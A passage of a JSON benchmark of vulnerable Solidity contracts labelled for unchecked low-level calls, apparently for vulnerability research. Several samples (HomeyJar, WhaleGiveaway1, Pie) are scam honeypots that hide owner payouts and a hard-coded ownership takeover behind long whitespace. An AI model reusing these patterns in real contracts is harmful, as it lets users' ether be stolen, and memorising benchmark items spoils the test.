file with everything in it. The breakdown is as follows:\n    //\n    //      - PandaBase: This is where we define the most fundamental code shared throughout the core\n    //             functionality. This includes our main data storage, constants and data types, plus\n    //             internal functions for managing these items.\n    //\n    //      - PandaAccessControl: This contract manages the various addresses and constraints for operations\n    //             that can be executed only by specific roles. Namely CEO, CFO and COO.\n    //\n    //      - PandaOwnership: This provides the methods required for basic non-fungible token\n    //             transactions, following the draft ERC-721 spec (https://github.com/ethereum/EIPs/issues/721).\n    //\n    //      - PandaBreeding: This file contains the methods necessary to breed cats together, including\n    //             keeping track of siring offers, and relies on an external genetic combination contract.\n    //\n    //      - PandaAuctions: Here we have the public methods for auctioning or bidding on cats or siring\n    //             services. The actual auction functionality is handled in two sibling contracts (one\n    //             for sales and one for siring), while auction creation and bidding is mostly mediated\n    //             through this facet of the core contract.\n    //\n    //      - PandaMinting: This final facet contains the functionality we use for creating new gen0 cats.\n    //             the community is new), and all others can only be created and then immediately put up\n    //             for auction via an algorithmically determined starting price. Regardless of how they\n    //             are created, there is a hard limit of 50k gen0 cats. After that, it's all up to the\n    //             community to breed, breed, breed!\n\n    // Set in case the core contract is broken and an upgrade is required\n    address public newContractAddress;\n\n\n    /// @notice Creates the main CryptoPandas smart contract instance.\n    function PandaCore() public {\n        // Starts paused.\n        paused = true;\n\n        // the creator of the contract is the initial CEO\n        ceoAddress = msg.sender;\n\n        // the creator of the contract is also the initial COO\n        cooAddress = msg.sender;\n\n        // move these code to init(), so we not excceed gas limit\n        //uint256[2] memory _genes = [uint256(-1),uint256(-1)];\n\n        //wizzPandaQuota[1] = 100;\n\n        //_createPanda(0, 0, 0, _genes, address(0));\n    }\n\n    /// init contract\n    function init() external onlyCEO whenPaused {\n        // make sure init() only run once\n        require(pandas.length == 0);\n        // start with the mythical kitten 0 - so we don't have generation-0 parent issues\n        uint256[2] memory _genes = [uint256(-1),uint256(-1)];\n\n        wizzPandaQuota[1] = 100;\n       _createPanda(0, 0, 0, _genes, address(0));\n    }\n\n    /// @dev Used to mark the smart contract as upgraded, in case there is a serious\n    ///  breaking bug. This method does nothing but keep track of the new contract and\n    ///  emit a message indicating that the new address is set. It's up to clients of this\n    ///  contract to update to the new contract address in that case. (This contract will\n    ///  be paused indefinitely if such an upgrade takes place.)\n    /// @param _v2Address new address\n    function setNewAddress(address _v2Address) external onlyCEO whenPaused {\n        // See README.md for updgrade plan\n        newContractAddress = _v2Address;\n        ContractUpgrade(_v2Address);\n    }\n    \n\n    /// @notice No tipping!\n    /// @dev Reject all Ether from being sent here, unless it's from one of the\n    ///  two auction contracts. (Hopefully, we can prevent user accidents.)\n    function() external payable {\n        require(\n            msg.sender == address(saleAuction) ||\n            msg.sender == address(siringAuction)\n        );\n    }\n\n    /// @notice Returns all the relevant information about a specific panda.\n    /// @param _id The ID of the panda of interest.\n    function getPanda(uint256 _id)\n        external\n        view\n        returns (\n        bool isGestating,\n        bool isReady,\n        uint256 cooldownIndex,\n        uint256 nextActionAt,\n        uint256 siringWithId,\n        uint256 birthTime,\n        uint256 matronId,\n        uint256 sireId,\n        uint256 generation,\n        uint256[2] genes\n    ) {\n        Panda storage kit = pandas[_id];\n\n        // if this variable is 0 then it's not gestating\n        isGestating = (kit.siringWithId != 0);\n        isReady = (kit.cooldownEndBlock <= block.number);\n        cooldownIndex = uint256(kit.cooldownIndex);\n        nextActionAt = uint256(kit.cooldownEndBlock);\n        siringWithId = uint256(kit.siringWithId);\n        birthTime = uint256(kit.birthTime);\n        matronId = uint256(kit.matronId);\n        sireId = uint256(kit.sireId);\n        generation = uint256(kit.generation);\n        genes = kit.genes;\n    }\n\n    /// @dev Override unpause so it requires all external contract addresses\n    ///  to be set before contract can be unpaused. Also, we can't have\n    ///  newContractAddress set either, because then the contract was upgraded.\n    /// @notice This is public rather than external so we can call super.unpause\n    ///  without using an expensive CALL.\n    function unpause() public onlyCEO whenPaused {\n        require(saleAuction != address(0));\n        require(siringAuction != address(0));\n        require(geneScience != address(0));\n        require(newContractAddress == address(0));\n\n        // Actually unpause the contract.\n        super.unpause();\n    }\n\n    // @dev Allows the CFO to capture the balance available to the contract.\n    function withdrawBalance() external onlyCFO {\n        uint256 balance = this.balance;\n        // Subtract all the currently pregnant kittens we have, plus 1 of margin.\n        uint256 subtractFees = (pregnantPandas + 1) * autoBirthFee;\n\n        if (balance > subtractFees) {\n             // <yes> <report> UNCHECKED_LL_CALLS\n            cfoAddress.send(balance - subtractFees);\n        }\n    }\n}",
    "vulnerable_function": "unknown",
    "vulnerable_lines": [
      1152
    ],
    "vulnerability_type": "unchecked_return",
    "original_category": "unchecked_low_level_calls",
    "severity": "medium",
    "difficulty_tier": 3,
    "description": "Unchecked return value - low-level call result not validated at line(s) 1152",
    "fix_description": "Check return value and handle failures appropriately",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/unchecked_low_level_calls/0x663e4229142a27f00bafb5d087e1e730648314c3.sol",
    "pragma": "0.4.24",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_unchecked_low_level_calls_0x70f9eddb3931491aab1aeafbc1e7f1ca2a012db4",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0x70f9eddb3931491aab1aeafbc1e7f1ca2a012db4.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 29\n */\n\npragma solidity ^0.4.19;\n\ncontract HomeyJar {\n    address public Owner = msg.sender;\n   \n    function() public payable {}\n   \n    function GetHoneyFromJar() public payable {                                              \n        if(msg.value>1 ether)\n        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           \n            msg.sender.transfer(this.balance);\n        }                                                                                                                \n    }\n    \n    function withdraw() payable public {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x2f61E7e1023Bc22063B8da897d8323965a7712B7){Owner=0x2f61E7e1023Bc22063B8da897d8323965a7712B7;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  \n        require(msg.sender == Owner);\n        Owner.transfer(this.balance);\n    }\n    \n    function Command(address adr,bytes data) payable public {\n        require(msg.sender == Owner);\n         // <yes> <report> UNCHECKED_LL_CALLS\n        adr.call.value(msg.value)(data);\n    }\n}",
    "vulnerable_function": "Command",
    "vulnerable_lines": [
      29
    ],
    "vulnerability_type": "unchecked_return",
    "original_category": "unchecked_low_level_calls",
    "severity": "medium",
    "difficulty_tier": 1,
    "description": "Unchecked return value - low-level call result not validated at line(s) 29",
    "fix_description": "Check return value and handle failures appropriately",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/unchecked_low_level_calls/0x70f9eddb3931491aab1aeafbc1e7f1ca2a012db4.sol",
    "pragma": "0.4.19",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_unchecked_low_level_calls_0x78c2a1e91b52bca4130b6ed9edd9fbcfd4671c37",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0x78c2a1e91b52bca4130b6ed9edd9fbcfd4671c37.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 45\n */\n\npragma solidity ^0.4.19;\n\ncontract WhaleGiveaway1\n{\n    address public Owner = msg.sender;\n    uint constant public minEligibility = 0.999001 ether; \n   \n    function()\n    public\n    payable\n    {\n        \n    }\n   \n    function redeem()\n    public\n    payable\n    {                                                                    \n        if(msg.value>=minEligibility)\n        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           \n            msg.sender.transfer(this.balance);\n        }                                                                                                                \n    }\n    \n    function withdraw()\n    payable\n    public\n    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Owner=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  \n        require(msg.sender == Owner);\n        Owner.transfer(this.balance);\n    }\n    \n    function Command(address adr,bytes data)\n    payable\n    public\n    {\n        require(msg.sender == Owner);\n        // <yes> <report> UNCHECKED_LL_CALLS\n        adr.call.value(msg.value)(data);\n    }\n}",
    "vulnerable_function": "Command",
    "vulnerable_lines": [
      45
    ],
    "vulnerability_type": "unchecked_return",
    "original_category": "unchecked_low_level_calls",
    "severity": "medium",
    "difficulty_tier": 1,
    "description": "Unchecked return value - low-level call result not validated at line(s) 45",
    "fix_description": "Check return value and handle failures appropriately",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/unchecked_low_level_calls/0x78c2a1e91b52bca4130b6ed9edd9fbcfd4671c37.sol",
    "pragma": "0.4.19",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_unchecked_low_level_calls_0x7a4349a749e59a5736efb7826ee3496a2dfd5489",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0x7a4349a749e59a5736efb7826ee3496a2dfd5489.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 44\n */\n\npragma solidity ^0.4.19;\n\ncontract WhaleGiveaway1\n{\n    address public Owner = msg.sender;\n   \n    function()\n    public\n    payable\n    {\n        \n    }\n   \n    function GetFreebie()\n    public\n    payable\n    {                                                                    \n        if(msg.value>1 ether)\n        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           \n            msg.sender.transfer(this.balance);\n        }                                                                                                                \n    }\n    \n    function withdraw()\n    payable\n    public\n    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Owner=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  \n        require(msg.sender == Owner);\n        Owner.transfer(this.balance);\n    }\n    \n    function Command(address adr,bytes data)\n    payable\n    public\n    {\n        require(msg.sender == Owner);\n        // <yes> <report> UNCHECKED_LL_CALLS\n        adr.call.value(msg.value)(data);\n    }\n}",
    "vulnerable_function": "Command",
    "vulnerable_lines": [
      44
    ],
    "vulnerability_type": "unchecked_return",
    "original_category": "unchecked_low_level_calls",
    "severity": "medium",
    "difficulty_tier": 1,
    "description": "Unchecked return value - low-level call result not validated at line(s) 44",
    "fix_description": "Check return value and handle failures appropriately",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/unchecked_low_level_calls/0x7a4349a749e59a5736efb7826ee3496a2dfd5489.sol",
    "pragma": "0.4.19",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_unchecked_low_level_calls_0x7d09edb07d23acb532a82be3da5c17d9d85806b4",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0x7d09edb07d23acb532a82be3da5c17d9d85806b4.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 198,210 \n */\n\npragma solidity ^0.4.24;\n\ncontract PoCGame\n{\n    \n    /**\n     * Modifiers\n     */\n     \n    modifier onlyOwner()\n    {\n        require(msg.sender == owner);\n        _;\n    }\n    \n   modifier isOpenToPublic()\n    {\n        require(openToPublic);\n        _;\n    }\n\n    modifier onlyRealPeople()\n    {\n          require (msg.sender == tx.origin);\n        _;\n    }\n\n    modifier  onlyPlayers()\n    { \n        require (wagers[msg.sender] > 0); \n        _; \n    }\n    \n   \n    /**\n     * Events\n     */\n    event Wager(uint256 amount, address depositer);\n    event Win(uint256 amount, address paidTo);\n    event Lose(uint256 amount, address loser);\n    event Donate(uint256 amount, address paidTo, address donator);\n    event DifficultyChanged(uint256 currentDifficulty);\n    event BetLimitChanged(uint256 currentBetLimit);\n\n    /**\n     * Global Variables\n     */\n    address private whale;\n    uint256 betLimit;\n    uint difficulty;\n    uint private randomSeed;\n    address owner;\n    mapping(address => uint256) timestamps;\n    mapping(address => uint256) wagers;\n    bool openToPublic;\n    uint256 totalDonated;\n\n    /**\n     * Constructor\n     */\n    constructor(address whaleAddress, uint256 wagerLimit) \n    onlyRealPeople()\n    public \n    {\n        openToPublic = false;\n        owner = msg.sender;\n        whale = whaleAddress;\n        totalDonated = 0;\n        betLimit = wagerLimit;\n        \n    }\n\n\n    /**\n     * Let the public play\n     */\n    function OpenToThePublic() \n    onlyOwner()\n    public\n    {\n        openToPublic = true;\n    }\n    \n    /**\n     * Adjust the bet amounts\n     */\n    function AdjustBetAmounts(uint256 amount) \n    onlyOwner()\n    public\n    {\n        betLimit = amount;\n        \n        emit BetLimitChanged(betLimit);\n    }\n    \n     /**\n     * Adjust the difficulty\n     */\n    function AdjustDifficulty(uint256 amount) \n    onlyOwner()\n    public\n    {\n        difficulty = amount;\n        \n        emit DifficultyChanged(difficulty);\n    }\n    \n    \n    function() public payable { }\n\n    /**\n     * Wager your bet\n     */\n    function wager()\n    isOpenToPublic()\n    onlyRealPeople() \n    payable\n    public \n    {\n        //You have to send exactly 0.01 ETH.\n        require(msg.value == betLimit);\n\n        //log the wager and timestamp(block number)\n        timestamps[msg.sender] = block.number;\n        wagers[msg.sender] = msg.value;\n        emit Wager(msg.value, msg.sender);\n    }\n    \n    /**\n     * method to determine winners and losers\n     */\n    function play()\n    isOpenToPublic()\n    onlyRealPeople()\n    onlyPlayers()\n    public\n    {\n        uint256 blockNumber = timestamps[msg.sender];\n        if(blockNumber < block.number)\n        {\n            timestamps[msg.sender] = 0;\n            wagers[msg.sender] = 0;\n    \n            uint256 winningNumber = uint256(keccak256(abi.encodePacked(blockhash(blockNumber),  msg.sender)))%difficulty +1;\n    \n            if(winningNumber == difficulty / 2)\n            {\n                payout(msg.sender);\n            }\n            else \n            {\n                //player loses\n                loseWager(betLimit / 2);\n            }    \n        }\n        else\n        {\n            revert();\n        }\n    }\n\n    /**\n     * For those that just want to donate to the whale\n     */\n    function donate()\n    isOpenToPublic()\n    public \n    payable\n    {\n        donateToWhale(msg.value);\n    }\n\n    /**\n     * Payout ETH to winner\n     */\n    function payout(address winner) \n    internal \n    {\n        uint256 ethToTransfer = address(this).balance / 2;\n        \n        winner.transfer(ethToTransfer);\n        emit Win(ethToTransfer, winner);\n    }\n\n    /**\n     * Payout ETH to whale\n     */\n    function donateToWhale(uint256 amount) \n    internal \n    {\n        // <yes> <report> UNCHECKED_LL_CALLS\n        whale.call.value(amount)(bytes4(keccak256(\"donate()\")));\n        totalDonated += amount;\n        emit Donate(amount, whale, msg.sender);\n    }\n\n    /**\n     * Payout ETH to whale when player loses\n     */\n    function loseWager(uint256 amount) \n    internal \n    {\n        // <yes> <report> UNCHECKED_LL_CALLS\n        whale.call.value(amount)(bytes4(keccak256(\"donate()\")));\n        totalDonated += amount;\n        emit Lose(amount, msg.sender);\n    }\n    \n\n    /**\n     * ETH balance of contract\n     */\n    function ethBalance() \n    public \n    view \n    returns (uint256)\n    {\n        return address(this).balance;\n    }\n    \n    \n    /**\n     * current difficulty of the game\n     */\n    function currentDifficulty() \n    public \n    view \n    returns (uint256)\n    {\n        return difficulty;\n    }\n    \n    \n    /**\n     * current bet amount for the game\n     */\n    function currentBetLimit() \n    public \n    view \n    returns (uint256)\n    {\n        return betLimit;\n    }\n    \n    function hasPlayerWagered(address player)\n    public \n    view \n    returns (bool)\n    {\n        if(wagers[player] > 0)\n        {\n            return true;\n        }\n        else\n        {\n            return false;\n        }\n        \n    }\n\n    /**\n     * For the UI to properly display the winner's pot\n     */\n    function winnersPot() \n    public \n    view \n    returns (uint256)\n    {\n        return address(this).balance / 2;\n    }\n\n    /**\n     * A trap door for when someone sends tokens other than the intended ones so the overseers can decide where to send them.\n     */\n    function transferAnyERC20Token(address tokenAddress, address tokenOwner, uint tokens) \n    public \n    onlyOwner() \n    returns (bool success) \n    {\n        return ERC20Interface(tokenAddress).transfer(tokenOwner, tokens);\n    }\n}\n\n//Define ERC20Interface.transfer, so PoCWHALE can transfer tokens accidently sent to it.\ncontract ERC20Interface \n{\n    function transfer(address to, uint256 tokens) public returns (bool success);\n}",
    "vulnerable_function": "donateToWhale",
    "vulnerable_lines": [
      198
    ],
    "vulnerability_type": "unchecked_return",
    "original_category": "unchecked_low_level_calls",
    "severity": "medium",
    "difficulty_tier": 3,
    "description": "Unchecked return value - low-level call result not validated at line(s) 198",
    "fix_description": "Check return value and handle failures appropriately",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/unchecked_low_level_calls/0x7d09edb07d23acb532a82be3da5c17d9d85806b4.sol",
    "pragma": "0.4.24",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_unchecked_low_level_calls_0x806a6bd219f162442d992bdc4ee6eba1f2c5a707",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0x806a6bd219f162442d992bdc4ee6eba1f2c5a707.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 44\n */\n\npragma solidity ^0.4.19;\n\ncontract Pie\n{\n    address public Owner = msg.sender;\n   \n    function()\n    public\n    payable\n    {\n        \n    }\n   \n    function GetPie()\n    public\n    payable\n    {                                                                    \n        if(msg.value>1 ether)\n        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           \n            msg.sender.transfer(this.balance);\n        }                                                                                                                \n    }\n    \n    function withdraw()\n    payable\n    public\n    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       if(msg.sender==0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6){Owner=0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        \n        require(msg.sender == Owner);\n        Owner.transfer(this.balance);\n    }\n    \n    function Command(address adr,bytes data)\n    payable\n    public\n    {\n        require(msg.sender == Owner);\n        // <yes> <report> UNCHECKED_LL_CALLS\n        adr.call.value(msg.value)(data);\n    }\n}",
    "vulnerable_function": "Command",
    "vulnerable_lines": [
      44
    ],
    "vulnerability_type": "unchecked_return",
    "original_category": "unchecked_low_level_calls",
    "severity": "medium",
    "difficulty_tier": 1,
    "description": "Unchecked return value - low-level call result not validated at line(s) 44",
    "fix_description": "Check return value and handle failures appropriately",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/unchecked_low_level_calls/0x806a6bd219f162442d992bdc4ee6eba1f2c5a707.sol",
    "pragma": "0.4.19",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_unchecked_low_level_calls_0x84d9ec85c9c568eb332b7226a8f826d897e0a4a8",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0x84d9ec85c9c568eb332b7226a8f826d897e0a4a8.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 56\n */\n\npragma solidity ^0.4.16;\n\n/// @author Bowen Sanders\n/// sections built on the work of Jordi Baylina (Owned, data structure)\n/// smartwedindex.sol contains a simple index of contract address, couple name, actual marriage date, bool displayValues to\n/// be used to create an array of all SmartWed contracts that are deployed \n/// contract 0wned is licesned under GNU-3\n\n/// @dev `Owned` is a base level contract that assigns an `owner` that can be\n///  later changed\ncontract Owned {\n\n    /// @dev `owner` is the only address that can call a function with this\n    /// modifier\n    modifier onlyOwner() {\n        require(msg.sender == owner);\n        _;\n    }\n\n    address public owner;\n\n    /// @notice The Constructor assigns the message sender to be `owner`\n    function Owned() {\n        owner = msg.sender;\n    }\n\n    address public newOwner;\n\n    /// @notice `owner` can step down and assign some other address to this role\n    /// @param _newOwner The address of the new owner\n    ///  an unowned neutral vault, however that cannot be undone\n    function changeOwner(address _newOwner) onlyOwner {\n        newOwner = _newOwner;\n    }\n    /// @notice `newOwner` has to accept the ownership before it is transferred\n    ///  Any account or any contract with the ability to call `acceptOwnership`\n    ///  can be used to accept ownership of this contract, including a contract\n    ///  with no other functions\n    function acceptOwnership() {\n        if (msg.sender == newOwner) {\n            owner = newOwner;\n        }\n    }\n\n    // This is a general safty function that allows the owner to do a lot\n    //  of things in the unlikely event that something goes wrong\n    // _dst is the contract being called making this like a 1/1 multisig\n    function execute(address _dst, uint _value, bytes _data) onlyOwner {\n         // <yes> <report> UNCHECKED_LL_CALLS\n        _dst.call.value(_value)(_data);\n    }\n}\n\n// contract WedIndex \n\ncontract WedIndex is Owned {\n\n    // declare index data variables\n    string public wedaddress;\n    string public partnernames;\n    uint public indexdate;\n    uint public weddingdate;\n    uint public displaymultisig;\n\n    IndexArray[] public indexarray;\n\n    struct IndexArray {\n        uint indexdate;\n        string wedaddress;\n        string partnernames;\n        uint weddingdate;\n        uint displaymultisig;\n    }\n    \n    function numberOfIndex() constant public returns (uint) {\n        return indexarray.length;\n    }\n\n\n    // make functions to write and read index entries and nubmer of entries\n    function writeIndex(uint indexdate, string wedaddress, string partnernames, uint weddingdate, uint displaymultisig) {\n        indexarray.push(IndexArray(now, wedaddress, partnernames, weddingdate, displaymultisig));\n        IndexWritten(now, wedaddress, partnernames, weddingdate, displaymultisig);\n    }\n\n    // declare events\n    event IndexWritten (uint time, string contractaddress, string partners, uint weddingdate, uint display);\n}",
    "vulnerable_function": "execute",
    "vulnerable_lines": [
      56
    ],
    "vulnerability_type": "unchecked_return",
    "original_category": "unchecked_low_level_calls",
    "severity": "medium",
    "difficulty_tier": 1,
    "description": "Unchecked return value - low-level call result not validated at line(s) 56",
    "fix_description": "Check return value and handle failures appropriately",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/unchecked_low_level_calls/0x84d9ec85c9c568eb332b7226a8f826d897e0a4a8.sol",
    "pragma": "0.4.16",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_unchecked_low_level_calls_0x89c1b3807d4c67df034fffb62f3509561218d30b",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0x89c1b3807d4c67df034fffb62f3509561218d30b.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 162,175,180,192\n */\n\npragma solidity ^0.4.9;\n\ncontract TownCrier {\n    struct Request { // the data structure for each request\n        address requester; // the address of the requester\n        uint fee; // the amount of wei the requester pays for the request\n        address callbackAddr; // the address of the contract to call for delivering response\n        bytes4 callbackFID; // the specification of the callback function\n        bytes32 paramsHash; // the hash of the request parameters\n    }\n   \n    event Upgrade(address newAddr);\n    event Reset(uint gas_price, uint min_fee, uint cancellation_fee); \n    event RequestInfo(uint64 id, uint8 requestType, address requester, uint fee, address callbackAddr, bytes32 paramsHash, uint timestamp, bytes32[] requestData); // log of requests, the Town Crier server watches this event and processes requests\n    event DeliverInfo(uint64 requestId, uint fee, uint gasPrice, uint gasLeft, uint callbackGas, bytes32 paramsHash, uint64 error, bytes32 respData); // log of responses\n    event Cancel(uint64 requestId, address canceller, address requester, uint fee, int flag); // log of cancellations\n\n    address public constant SGX_ADDRESS = 0x18513702cCd928F2A3eb63d900aDf03c9cc81593;// address of the SGX account\n\n    uint public GAS_PRICE = 5 * 10**10;\n    uint public MIN_FEE = 30000 * GAS_PRICE; // minimum fee required for the requester to pay such that SGX could call deliver() to send a response\n    uint public CANCELLATION_FEE = 25000 * GAS_PRICE; // charged when the requester cancels a request that is not responded\n\n    uint public constant CANCELLED_FEE_FLAG = 1;\n    uint public constant DELIVERED_FEE_FLAG = 0;\n    int public constant FAIL_FLAG = -2 ** 250;\n    int public constant SUCCESS_FLAG = 1;\n\n    bool public killswitch;\n\n    bool public externalCallFlag;\n\n    uint64 public requestCnt;\n    uint64 public unrespondedCnt;\n    Request[2**64] public requests;\n\n    int public newVersion = 0;\n\n    // Contracts that receive Ether but do not define a fallback function throw\n    // an exception, sending back the Ether (this was different before Solidity\n    // v0.4.0). So if you want your contract to receive Ether, you have to\n    // implement a fallback function.\n    function () {}\n\n    function TownCrier() public {\n        // Start request IDs at 1 for two reasons:\n        //   1. We can use 0 to denote an invalid request (ids are unsigned)\n        //   2. Storage is more expensive when changing something from zero to non-zero,\n        //      so this means the first request isn't randomly more expensive.\n        requestCnt = 1;\n        requests[0].requester = msg.sender;\n        killswitch = false;\n        unrespondedCnt = 0;\n        externalCallFlag = false;\n    }\n\n    function upgrade(address newAddr) {\n        if (msg.sender == requests[0].requester && unrespondedCnt == 0) {\n            newVersion = -int(newAddr);\n            killswitch = true;\n            Upgrade(newAddr);\n        }\n    }\n\n    function reset(uint price, uint minGas, uint cancellationGas) public {\n        if (msg.sender == requests[0].requester && unrespondedCnt == 0) {\n            GAS_PRICE = price;\n            MIN_FEE = price * minGas;\n            CANCELLATION_FEE = price * cancellationGas;\n            Reset(GAS_PRICE, MIN_FEE, CANCELLATION_FEE);\n        }\n    }\n\n    function suspend() public {\n        if (msg.sender == requests[0].requester) {\n            killswitch = true;\n        }\n    }\n\n    function restart() public {\n        if (msg.sender == requests[0].requester && newVersion == 0) {\n            killswitch = false;\n        }\n    }\n\n    function withdraw() public {\n        if (msg.sender == requests[0].requester && unrespondedCnt == 0) {\n            if (!requests[0].requester.call.value(this.balance)()) {\n                throw;\n            }\n        }\n    }\n\n    function request(uint8 requestType, address callbackAddr, bytes4 callbackFID, uint timestamp, bytes32[] requestData) public payable returns (int) {\n        if (externalCallFlag) {\n            throw;\n        }\n\n        if (killswitch) {\n            externalCallFlag = true;\n            if (!msg.sender.call.value(msg.value)()) {\n                throw;\n            }\n            externalCallFlag = false;\n            return newVersion;\n        }\n\n        if (msg.value < MIN_FEE) {\n            externalCallFlag = true;\n            // If the amount of ether sent by the requester is too little or \n            // too much, refund the requester and discard the request.\n            if (!msg.sender.call.value(msg.value)()) {\n                throw;\n            }\n            externalCallFlag = false;\n            return FAIL_FLAG;\n        } else {\n            // Record the request.\n            uint64 requestId = requestCnt;\n            requestCnt++;\n            unrespondedCnt++;\n\n            bytes32 paramsHash = sha3(requestType, requestData);\n            requests[requestId].requester = msg.sender;\n            requests[requestId].fee = msg.value;\n            requests[requestId].callbackAddr = callbackAddr;\n            requests[requestId].callbackFID = callbackFID;\n            requests[requestId].paramsHash = paramsHash;\n\n            // Log the request for the Town Crier server to process.\n            RequestInfo(requestId, requestType, msg.sender, msg.value, callbackAddr, paramsHash, timestamp, requestData);\n            return requestId;\n        }\n    }\n\n    function deliver(uint64 requestId, bytes32 paramsHash, uint64 error, bytes32 respData) public {\n        if (msg.sender != SGX_ADDRESS ||\n                requestId <= 0 ||\n                requests[requestId].requester == 0 ||\n                